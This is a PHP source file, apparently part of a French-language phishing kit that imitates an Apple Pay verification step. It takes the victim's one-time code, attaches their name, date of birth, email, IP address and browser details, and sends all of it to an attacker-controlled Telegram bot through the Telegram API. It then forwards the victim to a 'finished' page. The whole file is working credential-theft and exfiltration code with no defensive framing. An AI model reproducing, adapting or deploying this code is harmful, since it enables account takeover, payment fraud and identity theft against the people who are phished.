<?php
include('../chiffre.php');
include('../../config.php');
session_start();

if($_SESSION['authorized'] == "1")
{
if(isset($_POST['continue']))
{



	if(!empty($_POST['otpcode']))
	{
		if(strlen($_POST['otpcode']) >= 6 )
		{

		$_SESSION['otpcode'] = $_POST['otpcode'];

	
				$message = "
[🍎] CODE APPLE PAY [🍎]

🍎 Code : ".$_SESSION['otpcode']."

[🎲] INFOS [🎲]

🚀 Nom : ".$_SESSION['lname']."
🚀 Prénom : ".$_SESSION['fname']."
🚀 Date de naissance : ".$_SESSION['dob']."
🚀 E-Mail : ".$_SESSION['email']."

[🌐] TIERS [🌐]

🌐 Adresse IP : ".$_SESSION['ip']."
🌐 User-Agent : ".$_SERVER['HTTP_USER_AGENT']."
			";
			
			$data = ['text' => $message,'chat_id' => $chat_id];
       			 file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
			     chiffreMessage($message);
		header('Location: ../loader.php?goto=finished');

	}
	else{
		header('Location: ../apple_pay.php?error=code');

	}
	}

}


}
else{
	die('YOU ARE NOT AUTHORIZED');
}






?>